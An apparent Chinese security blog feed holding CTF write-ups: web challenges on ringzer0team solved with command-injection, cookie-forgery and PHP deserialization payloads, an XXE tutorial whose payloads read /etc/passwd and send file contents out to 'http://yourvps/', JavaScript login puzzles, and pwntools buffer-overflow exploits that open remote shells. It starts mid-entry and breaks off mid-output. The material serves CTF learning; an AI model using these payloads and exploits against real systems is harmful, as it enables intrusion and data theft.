= 'http://captcha.ringzer0team.com:7421'headers = &#123;'Authorization':'Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='&#125;for i in range(1000): # get captacha r = requests.get("http://captcha.ringzer0team.com:7421/form1.php",cookies=cookie,headers=headers) start_addr = r.text.find('if (A == "') + len('if (A == "') end_addr = r.text.find('"',start_addr) captcha = r.text[start_addr:end_addr] print(i,":",captcha) k = requests.get("http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new",cookies=cookie,headers=headers) data = &#123;'captcha': captcha&#125; k = requests.post('http://captcha.ringzer0team.com:7421/captcha1.php',cookies=cookie,headers=headers,data=data) 跑完后得到flag：1Congrats The flag is &quot;9bc635d4385e8a1775ad98980f44eb7d1714f69b&quot; Password reset有一个登陆框，需要用户名和密码，还有一个重置（reset）功能。题目提供了源码。如下：12345678910111213141516171819202122232425&lt;?phpif(isset($_POST['reset_username'])) &#123; srand(time()); $token = rand(1000000000000000,9999999999999999); $success = '&lt;div class="success"&gt;Reset password link has been sent to admin@youdontownthisemail.com. Please follow the link ...' $hSql-&gt;FastQuery('DELETE FROM chal_113 WHERE ip_addr = ?', array($_SERVER['REMOTE_ADDR'])); $hSql-&gt;FastQuery('insert into chal_113 values (?,?,?)', array($_SERVER['REMOTE_ADDR'], $token, time() + 3600));&#125;if(URL_HANDLE::GetInstance()-&gt;get-&gt;k != null) &#123; $result = reset($hSql-&gt;FastQuery('SELECT * FROM chal_113 WHERE ip_addr = ? AND recovery_key = ? ', array($_SERVER['REMOTE_ADDR'], URL_HANDLE::GetInstance()-&gt;get-&gt;k))); if($hSql-&gt;RowCount() != 0) &#123; if($result-&gt;expired_time &gt; time()) &#123; $success = '&lt;div class="success"&gt;Here\'s your new password: XXXXXXXXXXXXXX&lt;/div&gt;'; &#125; else &#123; $success = '&lt;div class="error"&gt;Expired recovery key!&lt;/div&gt;'; &#125; &#125; else &#123; $success = '&lt;div class="error"&gt;Invalid recovery key!&lt;/div&gt;'; &#125;&#125;?&gt; 伪随机数问题，还有就是关于unix时间戳的知识。目标很明确要对admin重置密码，当点了reset后，会根据当前的time生成一个token并存放在数据库中，这个就是下文的k值。 注意图片中是：2017 06:39:41 -0400。记得计算上时差为4个小时。所以实际时间应该是2017-07-01 10:39:41。写一个php脚本，生成需要的16位的digit code。1234567&lt;?php$t = strtotime('2017-07-01 10:39:41');echo($t . "&lt;br&gt;");srand($t);$token = rand(1000000000000000,9999999999999999);echo $token;?&gt; 上面代码在win平台下无法生成16位的code，这个不知道为什么。。。我换到unix环境后生成的token为 32933381064794967。访问：1http://ringzer0team.com/challenges/113/?k=3293338106479496 得到hint：1Here&apos;s your new password: Thi%P@s50rD!sM1n3* 登陆，得到flag：1FLAG-DlwwTV7vCQf4Dn281Yhb802x5U PHP Fairy有一个登陆框。题目给了源码12345678910111213141516171819202122232425262728&lt;?php$output = "";if (isset($_GET['code'])) &#123; $content = file_get_contents(__FILE__); $content = preg_replace('/FLAG\-[0-9a-zA-Z_?!.,]+/i', 'FLAG-XXXXXXXXXXXXXXXXXXXXXXX', $content); echo '&lt;div class="code-highlight"&gt;'; highlight_string($content); echo '&lt;/div&gt;';&#125;if (isset($_GET['pass'])) &#123; if(!preg_match('/^[^\W_]+$/', $_GET['pass'])) &#123; $output = "Don't hack me please :("; &#125; else &#123; $pass = md5("admin1674227342"); if ((((((((($_GET['pass'] == $pass)))) &amp;&amp; (((($pass !== $_GET['pass']))))) || ((((($pass == $_GET['pass'])))) &amp;&amp; ((($_GET['pass'] !== $pass)))))))) &#123; // Trolling u lisp masta if (strlen($pass) == strlen($_GET['pass'])) &#123; $output = "&lt;div class='alert alert-success'&gt;FLAG-XXXXXXXXXXXXXXXXXXXXXXX&lt;/div&gt;"; &#125; else &#123; $output = "&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"; &#125; &#125; else &#123; $output = "&lt;div class='alert alert-danger'&gt;Wrong password&lt;/div&gt;"; &#125; &#125;&#125;?&gt; 考察php弱类型。经过md5加密后生成以0e开头的字符串，而以0e开头的字符串用==比较时会被转换成0 == 0即成立。而!== 不仅比较值，而且还会比较类型。所以我们只要传入pass的值为一个0e开头的值，并且长度为32位（$pass长度为32位），比如说：0e509367213418206700842008763514。 得到flag：1FLAG-K7PY48gt02T1yvoO9jzP694FztgR1jIS Malicious upload 上传题，一般关注文件名后缀和content-type。经过fuzz：）知道，对filename，服务器端的检测时从左向右匹配.xxx，若遇到的第一个.xxx不是png则上传失败，另一个就是需要把content-type设置为image/png 得到flag：1FLAG-ve46i9UFtDh8Xd4hnqKRkP17 Security through obscurity!题目说：You don&#39;t have admin access.。一脸懵逼，抓包发现一个奇奇怪怪的cookie： 看着。。就很像base64加密；) 123&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode('Z3Vlc3QsZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LGZhbHNlOjIyOWQ3NDU5MmQ5MjNiOThlZjA3NjViNTU5OTkyZDI1')b'guest,e738b099a664e00e,1498908736,false:229d74592d923b98ef0765b559992d25' 后面那串感觉很像md5，解密无果。想想先尝试改改一些东西,，比如把guest改成admin，false改成true，base64加密后得到：1YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTA4NzM2LHRydWU6MjI5ZDc0NTkyZDkyM2I5OGVmMDc2NWI1NTk5OTJkMjU= 所以基本可以断定后面那串是md5，发包后，提示之后我把原始的包，没有改过cookie的包直接fowward掉后提示说：1Expired cookie. 说明有时间限制，结合前面做过的题目推断1498908736是unix时间戳，它可以直接转换为2017/7/1 19:32:16。接下来，从整体上看一下这个cookie，它被冒号:分为两段。所以：1md5(&quot;guest,e738b099a664e00e,1498908736,false&quot;) =&gt; 229d74592d923b98ef0765b559992d25 不过，第二个值不清楚是如何生成的，也许只是个随机值。所以我们改一改，记得把unix时间戳改大一点不然会提示过期：123md5(&quot;admin,e738b099a664e00e,1498999999,true&quot;) =&gt; 05fda7a65b3ac89393e7de85bc8db295base64(&quot;admin,e738b099a664e00e,1498999999,true:05fda7a65b3ac89393e7de85bc8db295&quot;) =&gt; YWRtaW4sZTczOGIwOTlhNjY0ZTAwZSwxNDk4OTk5OTk5LHRydWU6MDVmZGE3YTY1YjNhYzg5MzkzZTdkZTg1YmM4ZGIyOTU= 得到flag：1FLAG-Feg03OSzWhxO03K94108100f REST in peace题目提示：Your goal is to get superadmin access题目地址是：https://ringzer0team.com/challenges_page/web100_c0f8a764ea6592548917aaf18261f42c.php直接访问会显示Access Denied。抓包后在响应包头部发现奇怪的东东，见下： 发现是sha512加密，简单咯： 将字符串admin经过sha512加密后，在请求包中添加Strong-Auth字段。发送后得到以下内容：1234Document title security levelThe secret of the universe.docx privateBe Better In Bed By Richard MacDonald.docx publicThis file may contain a flag or not.docx extremely private 然后，，然后我还没做出来。待续。 PHP feature or 0day?题目给了源码。123456789101112&lt;?phpini_set('error_displays', 0);$ip = htmlspecialchars($_GET['url'], ENT_QUOTES);$f = fsockopen($ip, 80, $errno, $errstr, 5);if($f) &#123; $result = shell_exec('ping -c 4 ' . $ip); echo '&lt;div class="alert alert-success"&gt;' . nl2br($result) . '&lt;/div&gt;';&#125; else &#123; echo '&lt;div class="alert alert-danger"&gt;' .$errstr . '&lt;/div&gt;';&#125;?&gt; %0a绕过即可。payload1:1127.0.0.1%0als / 发现有flag.txt。 payload2：1127.0.0.1%0acat /flag.txt 得到flag：1FLAG-v0195ZH325rG9m20043Blm92LeRE77aF Password reset reloaded题目提供了源码。伪随机数的问题，跟前面的reset passwd的题一样，点了reset后，会提示说：1Reset password link has been sent to admin@youdontownthisemailagain.com. Please follow the link http://ringzer0team.com/challenges/120/?k=[your 16 digits code] soon as possible your token expired in 1 hour. 所以为了得到16位digits code，需要得到randomDigit。为得到randomDigit，需要先得到seed。而seed由$seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2));生成。用如下php代码生成：12345678910111213&lt;?php $token = ""; $size = 32; $seed = (int)bin2hex(openssl_random_pseudo_bytes($size / 2)); srand($seed); for($i = 0; $i &lt; 16; $i++) &#123; $randomDigit = (string)rand() % 10; $token .= "," . $randomDigit; &#125; $token = str_replace(",", "", $token); echo $token;?&gt; 得到16位digit code为3675356291270936。访问：1https://ringzer0team.com/challenges/120/?k=3675356291270936 得到passwd：CrytoIsCool!1337。登陆得到flag：1FLAG-LPmaGkfnDHrsMoOyHA7nIjOPRy Serial killer!点进去时链接是：1https://ringzer0team.com/challenges/41/?o=TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjoxOntzOjY6ImFjdGlvbiI7czoxNDoiR2V0Q3VycmVudERhdGUiO319 后面跟的一串base64加密，解密后为：1&apos;O:11:&quot;RandomClass&quot;:1:&#123;s:20:&quot;\x00RandomClass\x00uStruct&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:6:&quot;action&quot;;s:14:&quot;GetCurrentDate&quot;;&#125;&#125;&apos; 注意解密后里有\x00，是不可显示字符。从base64解密结果猜测为php反序列化问题。我们随便参数改改，传进去试试，结果得到报错： 格式化后源码如下：1234567891011121314151617181920212223242526272829303132333435363738394041class RandomClass &#123; private static $instance; private $uStruct; public function __construct() &#123; $this-&gt;uStruct = (object)array(); &#125; public static function GetInstance() &#123; if(!isset(self::$instance)) &#123; self::$instance = new self(); &#125; return self::$instance; &#125; public function __set($key, $value) &#123; $this-&gt;uStruct-&gt;$key = $value; &#125; public function __get($key) &#123; return $this-&gt;uStruct-&gt;$key; &#125; public function DoAction() &#123; $action = $this-&gt;uStruct-&gt;action; $this-&gt;$action(); &#125; public function GetCurrentDate() &#123; GetCurrentDate($this-&gt;uStruct); &#125; public function ShowFlag() &#123; if($this-&gt;uStruct-&gt;time !== null &amp;&amp; $this-&gt;uStruct-&gt;flag == 'Please?') &#123; ShowFlag($this-&gt;uStruct); &#125; &#125; public function GetOutput() &#123; return $this-&gt;uStruct-&gt;output; &#125;&#125; 由源码知道，uStruct由(object)array()得到，我们需要设置uStruct的action指为’ShowFlag’，这样才会调用ShowFlag函数。设置uStruct的flag值为’Please?’，设置uStruct的time值不为空，才能正确打印出flag。用如下脚本构造：1234567891011121314&lt;?phpclass RandomClass &#123; private static $instance; private $uStruct; public function __construct() &#123; $this-&gt;uStruct = (object)array('action'=&gt;'ShowFlag','time' =&gt; '1','flag' =&gt; 'Please?'); &#125;&#125;$chybeta = new RandomClass();echo serialize($chybeta);?&gt; 得到：1O:11:&quot;RandomClass&quot;:1:&#123;s:20:&quot;RandomClassuStruct&quot;;O:8:&quot;stdClass&quot;:3:&#123;s:6:&quot;action&quot;;s:8:&quot;ShowFlag&quot;;s:4:&quot;time&quot;;s:1:&quot;1&quot;;s:4:&quot;flag&quot;;s:7:&quot;Please?&quot;;&#125;&#125; 为能让服务器端正确解析，需要再加入两个不可见字符\x00，用python脚本如下:1234import base64# a = 'O:11:"RandomClass":1:&#123;s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":1:&#123;s:6:"action";s:14:"GetCurrentDate";&#125;&#125;';a ='O:11:"RandomClass":1:&#123;s:20:"\x00RandomClass\x00uStruct";O:8:"stdClass":3:&#123;s:6:"action";s:8:"ShowFlag";s:4:"time";s:1:"1";s:4:"flag";s:7:"Please?";&#125;&#125; 'print base64.b64encode(a) 得到：1TzoxMToiUmFuZG9tQ2xhc3MiOjE6e3M6MjA6IgBSYW5kb21DbGFzcwB1U3RydWN0IjtPOjg6InN0ZENsYXNzIjozOntzOjY6ImFjdGlvbiI7czo4OiJTaG93RmxhZyI7czo0OiJ0aW1lIjtzOjE6IjEiO3M6NDoiZmxhZyI7czo3OiJQbGVhc2U/Ijt9fSA= 抓包，替换参数，如下： 得到flag：1FLAG-Wz87W7Rv0nmK75Hmbq41qc2i Looking for the flag?可以用php://filter读到源码：1http://ringzer0team.com:1008/?page=php://filter/read=convert.base64-encode/resource=index.php 得到flag：1FLAG-MeCXGBsrLlYtdxlxSbumtUbb4J]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[小试XML实体注入攻击]]></title>
      <url>%2F2017%2F07%2F04%2F%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%2F</url>
      <content type="text"><![CDATA[XML实体注入攻击 基础知识XML（Extensible Markup Language）被设计用来传输和存储数据。关于它的语法，本文不准备写太多，只简单介绍一下。 XML基本知识12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;note&gt;&lt;to&gt;chybeta&lt;/to&gt;&lt;from&gt;ph0en1x&lt;/from&gt;&lt;/note&gt; 在上面代码中的第一行，定义XML的版本与编码。 在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。 同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。 实体所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。 实体类型XML实体分为四种：字符实体，命名实体，外部实体，参数实体。 文档类型定义：DTDwikipedia关于这的描述是:The XML DTD syntax is one of several XML schema languages。简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。 其基本格式：1&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt; 内部引入格式：1&lt;!ENTITY 实体名称 "实体的值"&gt; 将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY chybeta "Hello World!"&gt; ]&gt; &lt;xxe&gt; &amp;chybeta;&lt;/xxe&gt; 访问该XML文档，&amp;chybeta;会被解析为Hello World!并输出。 外部引入基本格式：1&lt;!ENTITY 实体名称 SYSTEM "URI"&gt; 通过引用定义在外部的DTD中的实体，我们称之为外部实体。由于xxe漏洞主要利用的是外部实体，所以这里暂不展开。具体实例见下。 利用方式xxe注入以php环境为例，index.php内容如下：1234&lt;?php $xml=simplexml_load_string($_GET['xml']); print_r((string)$xml);?&gt; 读取本地文件 利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取c盘里的TEST.txt。123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///c://TEST.txt"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 将上述xml进行url编码后传进去，可以发现读取了TEST.txt中的内容。 我这里测试时，如果不进行url编码则不能成功解析。 若使用fill协议，在unix环境下，可以用如下xml来读取passwd：123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。 123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 这里同样先经过url编码后再传入。读取结果如下: 命令执行php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。这里暂不进行测试。 内网探测/SSRF由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。 bind xxe以php环境为例，现在更改index.php内容如下：123&lt;?php $xml=simplexml_load_string($_GET['xml']);?&gt; 少了print_r，即没有回显消息。这个时候我们可以利用参数实体，通过发起http请求来攻击。 读取本地文件payload11234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "file:///c://TEST.txt"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;/value&gt; 在我的vps的xxe.xml的内容如下：1&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt; 而测试文件TEST.txt内容为：1chybeta 整个的调用过程如下：解析时%dtd引入xxe.xml，之后%all引入send的定义，最后引用了实体send，把%file文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log： 若要读取php等文件，同样需要先经过base64加密下。1234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;/value&gt; 查看access.log: payload2发送的xml：123456&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %send;]&gt; 而在vps上的xxe.xml内容为：1&lt;!ENTITY % payload2 "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://yourvps/%file;'&gt;"&gt; %payload2; 注意的是，&amp;#25; 不能直接写成%，否则无法解析。 xxe.xml中定义和引用了%payload2,在通过%dtd引入xxe.xml后，得以使用符号实体%send来进行发送。其中%file为读取的文件内容。查看access.log: ctf小试牛刀拿jarvisoj平台上的题目来小试牛刀吧。 题目：api调用 题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值 xxe相关WP AliCTF-Quals-2014 WebA-300 HCTF-2016 大图书管的牧羊人&amp;&amp;魔法禁书目录 GoSecure-CTF-2015 web-300]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ringzer0team-js-writeup]]></title>
      <url>%2F2017%2F06%2F30%2F%C2%96ringzer0team-js-writeup%2F</url>
      <content type="text"><![CDATA[未完待续..待续.. Client side validation is so secure? 查看源代码，发现下面的js123456789101112131415&lt;script&gt; // Look's like weak JavaScript auth script :) $(".c_submit").click(function(event) &#123; event.preventDefault() var u = $("#cuser").val(); var p = $("#cpass").val(); if(u == "admin" &amp;&amp; p == String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125; &#125;);&lt;/script&gt; 用控制台运行一下得到密码为：12String.fromCharCode(74,97,118,97,83,99,114,105,112,116,73,115,83,101,99,117,114,101)&quot;JavaScriptIsSecure&quot; 填入账号admin，密码JavaScriptIsSecure，得到flag：1FLAG-66Jq5u688he0y46564481WRh Is hashing more secure?查看源代码，发现js：1234567891011$(".c_submit").click(function(event) &#123; event.preventDefault(); var p = $("#cpass").val(); if(Sha1.hash(p) == "b89356ff6151527e89c4f3e3d30c8e6586c63962") &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125;&#125;); 工具网站：http://hashtoolkit.com得到密码为；adminz。填入，得到flag。1FLAG-bXNsYg9tLCaIX6h1UiQMmMYB Then obfuscation is more secure?1234&lt;script&gt; // Look's like weak JavaScript auth script :) var _0xc360=["\x76\x61\x6C","\x23\x63\x70\x61\x73\x73","\x61\x6C\x6B\x33","\x30\x32\x6C\x31","\x3F\x70\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65","\x63\x6C\x69\x63\x6B","\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"];$(.c_submit)[click](function ()&#123;var _0xf382x1=$(#cpass)[val]();var _0xf382x2=alk3;if(_0xf382x1==02l1+_0xf382x2)&#123;if(document[location][href][indexOf](?p=)==-1)&#123;document[location]=document[location][href]+?p=+_0xf382x1;&#125; ;&#125; else &#123;$(#cresponse)[html](&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;);&#125; ;&#125; );&lt;/script&gt; 拖到http://ddecode.com/解一下得到如下代码： 12345// Look's like weak JavaScript auth script :)var _0xc360 = ["val", "#cpass", "alk3", "02l1", "?p=", "indexOf", "href", "location", "&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;", "html", "#cresponse", "click", ".c_submit"];$(_0xc360[12])[_0xc360[11]](function() &#123; var _0xf382x1 = $(_0xc360[1])[_0xc360[0]](); var _0xf382x2 = _0xc360[2]; if (_0xf382x1 == _0xc360[3] + _0xf382x2) &#123; if (document[_0xc360[7]][_0xc360[6]][_0xc360[5]](_0xc360[4]) == -1) &#123; document[_0xc360[7]] = document[_0xc360[7]][_0xc360[6]] + _0xc360[4] + _0xf382x1; &#125;; &#125; else &#123; $(_0xc360[10])[_0xc360[9]](_0xc360[8]); &#125;;&#125;); 自己再替换一下。总算能看了。 12345678910111213var _0xc360 = ["val", "#cpass", "alk3", "02l1", "?p=", "indexOf", "href", "location", "&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;", "html", "#cresponse", "click", ".c_submit"];$(".c_submit")["click"](function() &#123; var _0xf382x1 = $("#cpass")["val"](); var _0xf382x2 = "alk3"; if (_0xf382x1 == "02l1" + _0xf382x2) &#123; if (document["location"]["href"]["indexOf"]("?p=",) == -1) &#123; document["location"] = document["location"]["href"] + "?p=", + _0xf382x1; &#125;; &#125; else &#123; $("#cresponse")["html"]("&lt;div class='error'&gt;Wrong password sorry.&lt;/div&gt;"); &#125;;&#125;); 所以密码是 02l1alk3，得到flag：1FLAG-5PJne3T8d73UGv4SCqN44DXj Why not?12345678910111213141516171819202122232425$(".c_submit").click(function(event) &#123; event.preventDefault(); var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = $("#cuser").val(); var p = $("#cpass").val(); var t = true; if(u == "administrator") &#123; for(i = 0; i &lt; u.length; i++) &#123; if((u.charCodeAt(i) + p.charCodeAt(i) + i * 10) != k[i]) &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); t = false; break; &#125; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); t = false; &#125; if(t) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + p; &#125; &#125;&#125;); 写一个js脚本。123456789&lt;script&gt; var k = new Array(176,214,205,246,264,255,227,237,242,244,265,270,283); var u = "administrator"; var p = ""; for (i = 0; i &lt; u.length; i++)&#123; p += String.fromCharCode(k[i] - i * 10 - u.charCodeAt(i) ); &#125; alert(p);&lt;/script&gt; 弹框得到结果：OhLord4309111，得到flag：1FLAG-65t23674o6N2NehA44272G24 Valid key required1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&lt;script&gt; function curry( orig_func ) &#123; var ap = Array.prototype, args = arguments; function fn() &#123; ap.push.apply( fn.args, arguments ); return fn.args.length &lt; orig_func.length ? fn : orig_func.apply( this, fn.args ); &#125; return function() &#123; fn.args = ap.slice.call( args, 1 ); return fn.apply( this, arguments ); &#125;; &#125; function callback(x,y,i,a) &#123; return !y.call(x, a[a["length"]-1-i].toString().slice(19,21)) ? x : &#123;&#125;; &#125; var ref = &#123;T : "BG8",J : "jep",j : "M2L",K : "L23",H : "r1A"&#125;; function validatekey() &#123; e = false; var _strKey = ""; try &#123; _strKey = document.getElementById("key").value; var a = _strKey.split("-"); if(a.length !== 5) e = true; var o=a.map(genFunc).reduceRight(callback, new (genFunc(a[4]))(Function)); if(!equal(o,ref)) e = true; &#125;catch(e)&#123; e = true; &#125; if(!e) &#123; if(document.location.href.indexOf("?p=") == -1) &#123; document.location = document.location.href + "?p=" + _strKey; &#125; &#125; else &#123; $("#cresponse").html("&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"); &#125; &#125; function equal(o,o1) &#123; var keys1 = Object.keys(o1); var keys = Object.keys(o); if(keys1.length != keys.length) return false; for(var i=0;i&lt;keys.length;i++) if(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]]) return false; return true; &#125; function hook(f1,f2,f3) &#123; return function(x) &#123; return f2(f1(x),f3(x));&#125;; &#125; var h = curry(hook); var fn = h(function(x) &#123;return x &gt;= 48;&#125;,new Function("a","b","return a &amp;&amp; b;")); function genFunc(_part) &#123; if(!_part || !(_part.length) || _part.length !== 4) return function() &#123;&#125;; return new Function(_part.substring(1,3), "this." + _part[3] + "=" + _part.slice(1,3) + "+" + (fn(function(y)&#123;return y&lt;=57&#125;)(_part.charCodeAt(0)) ? _part[0] : "'"+ _part[0] + "'")); &#125;&lt;/script&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XMAN-pwn-writeup]]></title>
      <url>%2F2017%2F06%2F29%2FXMAN-pwn-writeup%2F</url>
      <content type="text"><![CDATA[web狗的二进制之路 level 0 x64分析main函数： vuln函数: 用strings可以看到，有/bin/sh，这样我们不用再去写入了。 exp12345678910111213141516from pwn import *p = remote("pwn2.jarvisoj.com",9881)elf = ELF("./level0")offset = 0x80 + 8system_addr = elf.symbols['system']sh_addr = next(elf.search('/bin/sh'))pop_rdi_ret_addr = 0x0000000000400663payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_addr)p.send(payload)p.interactive() flag123456789101112131415(venv) chybeta@ubuntu:~/pwn/ctf/xman/0$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done[*] &apos;/home/chybeta/pwn/ctf/xman/0/level0&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeHello, World$ lsflaglevel0_x64$ cat flagCTF&#123;713ca3944e92180e0ef03171981dcd41&#125; level 1分析main函数； vulnerable_function函数： 很明显的栈溢出漏洞。溢出点用pattern查出为140个字节。用checksec看后发现NX没有开启，可以插入shellcode。题目也给出了buf的地址。因此可以在buf数组中插入shellcode，然后再溢出跳转到buf的起始位置去执行shellcode。 exp12345678910111213141516171819from pwn import *p = remote("pwn2.jarvisoj.com",9877)# p = process("./level1")elf = ELF("./level1")p.recvuntil("What's this:")buf_addr = p.recvuntil("?")[:-1]buf_addr = int(buf_addr,16)offset = 140shellcode = asm(shellcraft.sh())payload = shellcodepayload = payload.ljust(140,'a')payload += p32(buf_addr)p.send(payload)p.interactive() flag12345678910111213141516(venv) chybeta@ubuntu:~/pwn/ctf/xman/xman1$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done[*] &apos;/home/chybeta/pwn/ctf/xman/xman1/level1&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE[*] Switching to interactive mode$$ lsflaglevel1$ cat flagCTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125; level 2分析main函数 vulnerable_function函数： 这题用strings查看时，会发现有/bin/sh字符串，不需要我们再去写入了。用gdb去调试，没成功，栈被重置了。不过从vuln函数里可以很清楚的看到，它先调用了一次system，而且read中存在栈溢出漏洞。而且buf的地址在bp-88h的位置。从内存的分布知道，当前栈帧的ebp再减去4个字节就是return的地址。所以溢出的offset同样是 0x88 + 4。所以这题的思路就是，覆盖返回地址，跳转到system，构造栈上的参数，给system传入sh/。 exp1234567891011121314from pwn import *p = remote("pwn2.jarvisoj.com",9878)elf = ELF("./level2")offset = 0x88 + 4sh_addr = next(elf.search('/bin/sh'))payload = 'a' * offsetpayload += p32(elf.symbols['system'])payload += p32(1) #paddingpayload += p32(sh_addr)p.send(payload)p.interactive() flag12345678910111213141516(venv) chybeta@ubuntu:~/pwn/ctf/xman/2$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done[*] &apos;/home/chybeta/pwn/ctf/xman/2/level2&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE[*] Switching to interactive modeInput:$ lsflaglevel2$ cat flagCTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;$ level 2 x64分析换成64位版本，参数要用rdi传递。binary中有sh字符串，直接利用就可以。这题似乎跟level0差不多啊。。 exp12345678910111213141516171819from pwn import *p = remote("pwn2.jarvisoj.com",9882)# p = process("./level2_x64")elf = ELF("./level2_x64")offset = 0x80 + 8pop_rdi_ret_addr = 0x00000000004006b3pop_rsi_pop_r15_ret_addr = 0x00000000004006b1system_plt = elf.plt['system']sh_addr = next(elf.search("/bin/sh"))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(sh_addr)payload += p64(system_plt)p.send(payload)p.interactive() flag123456789101112131415(venv) chybeta@ubuntu:~/pwn/ctf/xman/2x64$ python exp.py[+] Opening connection to pwn2.jarvisoj.com on 